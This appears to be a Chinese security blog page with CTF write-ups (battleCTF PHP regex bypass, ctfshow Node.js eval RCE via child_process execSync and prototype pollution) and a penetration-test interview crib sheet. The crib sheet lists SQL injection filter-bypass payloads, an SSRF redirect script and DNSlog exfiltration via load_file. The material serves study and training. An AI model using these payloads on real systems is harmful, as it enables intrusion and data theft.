    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$cigar</span></span>/"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$cigar</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">africa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"home.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ok，大概意思就是在传入source后会显示源码，之后如果再传入ami的话，再进行一个正则匹配意思就是将<strong>cigar</strong>的值<strong>africacradlecivilization</strong>删除后如果还等于<strong>cigar</strong>那就进行下一步，那么可以想到双写进行绕过。传入<code>?source=&amp;ami=africacrafricacradlecivilizationadlecivilization</code>即可得到flag。<br><img src="https://img-blog.csdnimg.cn/f267e5a536424c08971111a00c024839.png" alt="2"></p>
<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Thumb"><a href="#Thumb" class="headerlink" title="Thumb"></a>Thumb</h3><p><img src="https://img-blog.csdnimg.cn/0f847f4b10fe4d4bb16ec186df53b093.png" alt="3"></p>
<p>这道题下载之后就是一张图片查看的时候变成了二维码。<img src="https://img-blog.csdnimg.cn/edbed056a8ce45bbbcd0895bd8a43ce5.jpeg" alt="3"><br><img src="https://img-blog.csdnimg.cn/98b35979c0f1473c99e3d22abc891009.png" alt="5"><br>微信扫一扫即出flag。<br><img src="https://img-blog.csdnimg.cn/3f6b41a7f97f4c14a519c2f49c53fc3a.png" alt="6"></p>
<h3 id="Find-Me"><a href="#Find-Me" class="headerlink" title="Find Me"></a>Find Me</h3><p>是一道流量分析题<br><img src="https://img-blog.csdnimg.cn/fc1e3addbbd644998d2bc407ce192e81.png" alt="7"><br>过滤http包<br><img src="https://img-blog.csdnimg.cn/75c6715314054dfa82d12a4cc6b877f5.png" alt="1"><br>账户密码一般是POST方式传入，查看到密码密文，就是简单的base46加密。解码之后得到明文密码<br><img src="https://img-blog.csdnimg.cn/db80329811b0440991c50c78e908797c.png" alt="1"><br>最后flag为<code>battleCTF&#123;PApdsjRTae&#125;</code></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Back-To-Origin"><a href="#Back-To-Origin" class="headerlink" title="Back To Origin"></a>Back To Origin</h3><p><img src="https://img-blog.csdnimg.cn/ac05d62cc039487b89ae19d4e08314fe.png" alt="1">古埃及象形文字<br><a target="_blank" rel="noopener" href="https://www.likefont.com/">识别字体网站</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-ctfshoow-nodejs"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/06/23/ctfshoow-nodejs/"
    >ctfshoow-nodejs</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/06/23/ctfshoow-nodejs/" class="article-date">
  <time datetime="2023-06-23T10:19:49.000Z" itemprop="datePublished">2023-06-23</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/ctfshow/">ctfshow</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <meta name="referrer" content="no-referrer"/>

<h2 id="335"><a href="#335" class="headerlink" title="335"></a>335</h2><p>一道rce题目<br><strong>require(‘child_process’).execSync(‘ls’);</strong></p>
<h2 id="336"><a href="#336" class="headerlink" title="336"></a>336</h2><p>发现被过滤了东西，<br><code>?eval=__filename</code>:打印出当下文件路径。<br><code>?eval=__dirname</code>:打印出当下所在文件夹路径。<br><img src="https://img-blog.csdnimg.cn/e9bed0e011fc43859dc646488a80f9bd.png" alt="1"><br>然后读取文件<code>?eval=require(&#39;fs&#39;).readFileSync(&#39;/app/routes/index.js&#39;,&#39;utf-8&#39;)</code><br><img src="https://img-blog.csdnimg.cn/28c279fff781455bbb9b44b2c0556449.png" alt="2"><br>被过滤了，绕过过滤。<br><code>?eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;);</code>再进行url编码一下。<br><img src="https://img-blog.csdnimg.cn/d5576132fdeb4f0786bfb052d3b942c6.png" alt="3">命令执行即可得到flag。<br><img src="https://img-blog.csdnimg.cn/e59fe23388254d009bdd149868b776ec.png" alt="4"></p>
<p>读取文件得到flag也行。</p>
<h2 id="337"><a href="#337" class="headerlink" title="337"></a>337</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/* GET home page. */</span>
router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>
  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  	res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>简单的数组绕过<code>?a[]=1&amp;b[]=1</code>即可得到flag。<br><img src="https://img-blog.csdnimg.cn/03ad667c580b4a9d96f30777554c3985.png" alt="3"></p>
<h2 id="338"><a href="#338" class="headerlink" title="338"></a>338</h2><p>下载给的源码，找到login.js文件。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token comment">/* GET home page.  */</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>
  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//***关键点</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  <span class="token punctuation">&#125;</span>
  
  
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>原型链污染<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">学习文章</a><br><img src="https://img-blog.csdnimg.cn/04baaf7cddac488a88409bfd74e1f5b4.png" alt="5"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-hvv初级面试总结"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/06/20/hvv%E5%88%9D%E7%BA%A7%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"
    >hvv初级面试总结</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/06/20/hvv%E5%88%9D%E7%BA%A7%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2023-06-20T11:14:47.000Z" itemprop="datePublished">2023-06-20</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/hvv/">hvv</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <meta name="referrer" content="no-referrer"/>

<h2 id="OWASP-Top10有哪些漏洞"><a href="#OWASP-Top10有哪些漏洞" class="headerlink" title="OWASP Top10有哪些漏洞"></a>OWASP Top10有哪些漏洞</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">SQL</span>注入
失效的身份认证
敏感数据泄露
<span class="token constant">XML</span>外部实体（<span class="token constant">XXE</span>）
失效的访问控制
安全配置错误
跨站脚本（<span class="token constant">XSS</span>）
不安全的反序列化
使用含有已知漏洞的组件
不足的日志记录和监控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="常见数据库默认端口"><a href="#常见数据库默认端口" class="headerlink" title="常见数据库默认端口"></a>常见数据库默认端口</h2><p>MySql：3306</p>
<p>Oracle：1521</p>
<p>Redis：6379</p>
<p>Mssql：1433    &#x2F;&#x2F;全称：Microsoft SQL Server</p>
<p>PostgreSQL：5432</p>
<p><strong>但在实际使用中可能会根据需要进行修改</strong></p>
<h2 id="SQL注入的流量分析"><a href="#SQL注入的流量分析" class="headerlink" title="SQL注入的流量分析"></a>SQL注入的流量分析</h2><p>通过日志查看攻击者输入的字段。一般在用户密码登录时攻击者会注入恶意SQL语句，如果网站不对用户输入的内容 进行限制，极易出现对网站的破坏。</p>
<p>union ,select ，sleep 等敏感字符。</p>
<h2 id="常见SQL注入绕过"><a href="#常见SQL注入绕过" class="headerlink" title="常见SQL注入绕过"></a>常见SQL注入绕过</h2><p><strong>SQL注入大小写绕过：</strong></p>
<p>通过将语句大小写更改，进行绕过。（这种情况通常出现在WAF对打小写没有过滤的情况下）</p>
<pre class="line-numbers language-none"><code class="language-none">UniOn AND 1 &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQL注入注释符绕过:</strong></p>
<p>通过添加注释符对语句内容进行绕</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;*绕过的内容*&#x2F;select user,password from &#x2F;**&#x2F;users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQL注入空格绕过</strong></p>
<p>通过添加空格的URL编码进入绕过</p>
<pre class="line-numbers language-none"><code class="language-none">空格的URL编码%20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQL注入引号绕过</strong></p>
<p>使用到引号的地方一般在语句中，像where语句，这条语句意识就是用来查得到users表中所有字段</p>
<pre class="line-numbers language-none"><code class="language-none">select column_name from information_schema.tables where table_name&#x3D;&quot;users&quot;select column_name from information_schema.tables where table_name&#x3D;&quot;text&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>SQL注入十六进制绕过</strong></p>
<p>当引号绕过方法被过滤的情况下，还可以利用进制进行绕过。</p>
<pre class="line-numbers language-none"><code class="language-none">将users转换为十六进制进行绕过select column_name from information_schema.tables where table_name&#x3D;0x7573657273<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>SQL注入from for语句绕过</strong></p>
<p>当进行SQL盲注会用到，<code>substr()</code> ,<code>mid()</code> ,<code>limit</code>。这些句子方法都需要用到逗号。对于<code>substr()</code> ,<code>mid()</code> 句子可以直接利用from for句子进行绕过。</p>
<pre class="line-numbers language-none"><code class="language-none">单引号绕过，与from for绕过 select substr(database() from 1 for 1)&#x3D;&#39;tyaq&#39;; select mid(database() from 1 for 1)&#x3D;&#39;tyaq&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>SQL注入比较符绕过&lt;&gt;</strong></p>
<p>sql盲注,使用二分查找时需要使用到比较符来进行。</p>
<pre class="line-numbers language-none"><code class="language-none">select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;88<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>SQL注入greatest绕过</strong></p>
<p>当比较符被系统过滤了，比较符盲注语句无法使用时，可以使用greatest来代替比较操作符。<code>greatest(n1,n2,n3,n4等)</code>函数返回输入参数<code>(n1,n2,n3,n4等)</code>的最大值。</p>
<p>sql语句可以使用greatest变为ascii码值进行大小爆破</p>
<pre class="line-numbers language-none"><code class="language-none">select * from cms_users where userid&#x3D;1 and greatest(ascii(substr(database(),1,1)),1)&#x3D;88;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQL注入编码绕过</strong></p>
<p>URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
<pre class="line-numbers language-none"><code class="language-none">ASCII码绕过Test 等价于CHAR(55)+CHAR(66)+CHAR(88)+CHAR(99)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>对关键字进行URL编码绕过</p>
<pre class="line-numbers language-none"><code class="language-none">URL编码转换绕过1+and+1&#x3D;11+%25%36%31%25%36%65%25%36%34+1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>16进制编码转换绕过</p>
<pre class="line-numbers language-none"><code class="language-none">将users转换为十六进制进行绕过select column_name from information_schema.tables where table_name&#x3D;users;select column_name from information_schema.tables where table_name&#x3D;0x7573657273;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQL注入内联注释绕过</strong></p>
<pre class="line-numbers language-none"><code class="language-none">内联注释就是把一些特有的仅在MYSQL上的语句放在 &#x2F;!..&#x2F; 中，这些语句如果在其它数据库中是不会被执行而在SQL数据库中可被执行 select * from cms_users where userid&#x3D;1 union &#x2F;*!select*&#x2F; 1,2,3;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="sql注入过滤"><a href="#sql注入过滤" class="headerlink" title="sql注入过滤"></a>sql注入过滤</h2><ol>
<li><strong>使用参数化查询</strong>：参数化查询可以将用户输入和SQL代码分开，从而避免SQL注入攻击。通过使用预编译语句和参数化查询语句，应用程序可以把用户输入转化为参数，而不是直接拼接到SQL语句中。</li>
<li><strong>对输入进行过滤和验证</strong>：在应用程序中对输入数据进行过滤和验证，可以有效地减少SQL注入攻击的风险。可以使用白名单或黑名单机制，过滤掉非法字符或语句，或者对输入数据进行格式验证和长度限制。</li>
<li><strong>使用ORM框架</strong>：使用ORM框架可以避免手动拼接SQL语句，从而减少SQL注入攻击的风险。ORM框架可以自动将数据转换为参数，从而防止恶意SQL注入攻击。</li>
<li><strong>使用防火墙</strong>：使用Web应用程序防火墙可以监测和防止SQL注入攻击。防火墙可以对输入数据进行检查，过滤掉恶意SQL语句，从而保护应用程序不受攻击。</li>
</ol>
<h2 id="Sql注入分类"><a href="#Sql注入分类" class="headerlink" title="Sql注入分类"></a>Sql注入分类</h2><p>报错注入、盲注、时间盲注、二次注入，宽字节,堆叠注入，http header的注入，xff，cookie注入</p>
<h3 id="宽字节注入条件"><a href="#宽字节注入条件" class="headerlink" title="宽字节注入条件"></a><strong>宽字节注入条件</strong></h3><p>1.数据库为GBK编码<br> 2.使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符  \  进行转义</p>
<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a><strong>绕过方式</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root %df' or <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span>
<span class="token comment"># 原理:在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="SQL二次注入"><a href="#SQL二次注入" class="headerlink" title="SQL二次注入"></a>SQL二次注入</h2><p>二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
<h2 id="SQL报错注入"><a href="#SQL报错注入" class="headerlink" title="SQL报错注入"></a>SQL报错注入</h2><p>函数：</p>
<p>floor()函数，</p>
<p>exp()函数，</p>
<p>convert()函数，</p>
<p>updataxml()函数，返回数据长度&lt;32位</p>
<p>name_const()函数，</p>
<p>extractvalue()函数：返回数据长度&lt;32位</p>
<h2 id="XXE漏洞（即XMl外部实体注入漏洞）"><a href="#XXE漏洞（即XMl外部实体注入漏洞）" class="headerlink" title="XXE漏洞（即XMl外部实体注入漏洞）"></a>XXE漏洞（即XMl外部实体注入漏洞）</h2><p><strong>XXE</strong>漏洞触发点往往是可以上传xml文件的位置，没有对xml文件进行过滤，导致可加载恶意外部文件和代码，造成任意文件读取，命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害</p>
<h2 id="怎么判断网站是否存在XXE漏洞"><a href="#怎么判断网站是否存在XXE漏洞" class="headerlink" title="怎么判断网站是否存在XXE漏洞"></a>怎么判断网站是否存在XXE漏洞</h2><p>最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞</p>
<h2 id="CSRF攻击原理"><a href="#CSRF攻击原理" class="headerlink" title="CSRF攻击原理"></a>CSRF攻击原理</h2><p><img src="https://pic1.zhimg.com/80/v2-74875be6a3bcbd97e58dc00d86f571e0_1440w.webp" alt="123"></p>
<ol>
<li>用户输入账号信息请求登录A网站。</li>
<li>A网站验证用户信息，通过验证后返回给用户一个cookie</li>
<li>在未退出网站A之前，在同一浏览器中请求了黑客构造的恶意网站B</li>
<li>B网站收到用户请求后返回攻击性代码，构造访问A网站的语句</li>
<li>浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客就可以进行一下骚操作了！</li>
</ol>
<p>两个条件：a 用户访问站点A并产生了cookie</p>
<p>b 用户没有退出A同时访问了B</p>
<h2 id="SSRF漏洞（服务器端请求伪造）"><a href="#SSRF漏洞（服务器端请求伪造）" class="headerlink" title="SSRF漏洞（服务器端请求伪造）"></a>SSRF漏洞（服务器端请求伪造）</h2><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
<p>从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>利用的是服务端的请求伪造。</p>
<p>SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<h3 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h3><p><strong>1.@符号绕过：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xxx.com@www.kxsy.work&#x2F;
1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在某地址1后添加@再次添加地址2，浏览器会自动返回地址2数据</p>
<p><strong>2.IP地址转换：</strong></p>
<p>对内网请求的IP地址进行各进制的编码</p>
<p><strong>3.转换短网址：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.985.so&#x2F;
例：http:&#x2F;&#x2F;www.kxsy.work&#x2F; &#x3D; http:&#x2F;&#x2F;u6.gg&#x2F;ks69x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>4.特殊符号替换绕过：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">例：
http:&#x2F;&#x2F;www.kxsy.work&#x2F; &#x3D; http:&#x2F;&#x2F;www。kxsy。work&#x2F;
localhost或者0.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>5.302跳转绕过：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php  
$schema &#x3D; $_GET[&#39;s&#39;];
$ip     &#x3D; $_GET[&#39;i&#39;];
$port   &#x3D; $_GET[&#39;p&#39;];
$query  &#x3D; $_GET[&#39;q&#39;];
if(empty($port))&#123;  
    header(&quot;Location: $schema:&#x2F;&#x2F;$ip&#x2F;$query&quot;); 
&#125; else &#123;
    header(&quot;Location: $schema:&#x2F;&#x2F;$ip:$port&#x2F;$query&quot;); 
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>6.xip.io绕过：会将解析到子域</strong></p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.0.0.1.xip.io &#x3D; 10.0.0.1
www.10.0.0.1.xip.io&#x3D; 10.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>8.其他协议绕过 ：</strong></p>
<p>配合File、 GOPHER等协议的对目标进行信息探测</p>
<h2 id="XSS（跨站点脚本攻击）"><a href="#XSS（跨站点脚本攻击）" class="headerlink" title="XSS（跨站点脚本攻击）"></a>XSS（跨站点脚本攻击）</h2><p>服务器对用户提交的数据过滤不严，导致浏览器把用户的输入当成了JS代码并直接返回给客户端执行，从而实现<strong>对客户端的攻击</strong>目的。</p>
<p>反射型XSS</p>
<p>存储型XSS</p>
<p>DOM型XSS：DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p>
<h2 id="xss与csrf的区别"><a href="#xss与csrf的区别" class="headerlink" title="xss与csrf的区别"></a>xss与csrf的区别</h2><p>**xss：跨站脚本攻击、诱骗用户点击恶意链接盗取用户cookie进行攻击、不需要用户进行登录、xss除了利用cookie还可以篡改网页等. **</p>
<p><strong>csrf：跨站请求伪造、无法获取用户的cookie而是直接冒充用户、需要用户登录后进行操作</strong></p>
<h2 id="哪里使用到了dnslog外带"><a href="#哪里使用到了dnslog外带" class="headerlink" title="哪里使用到了dnslog外带"></a>哪里使用到了dnslog外带</h2><h3 id="DNSlog外带原理："><a href="#DNSlog外带原理：" class="headerlink" title="DNSlog外带原理："></a>DNSlog外带原理：</h3><p>DNS在解析的时候会留下日志，我们将信息放在高级域名中，传递到自己这里，然后通过读日志获取信息。</p>
<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><p>盲注需要频繁请求才能获取数据库中的值，在有waf的情况下很容易被ban ip。这种情况下可以结合DNSLog将数据取出。<strong>如果遇到MySQL的盲注，可以利用内置函数load_file()来完成DNSLog。load_file()不仅能够加载本地文件，同时也能对诸如<code>www.baidu.com</code>这样的url发起请求</strong></p>
<h3 id="无回显的SSRF"><a href="#无回显的SSRF" class="headerlink" title="无回显的SSRF"></a>无回显的SSRF</h3><p>将url换成我们的DNS服务器，通过查看DNSLog平台日志查看是否有服务器ip判断是否有ssrf漏洞</p>
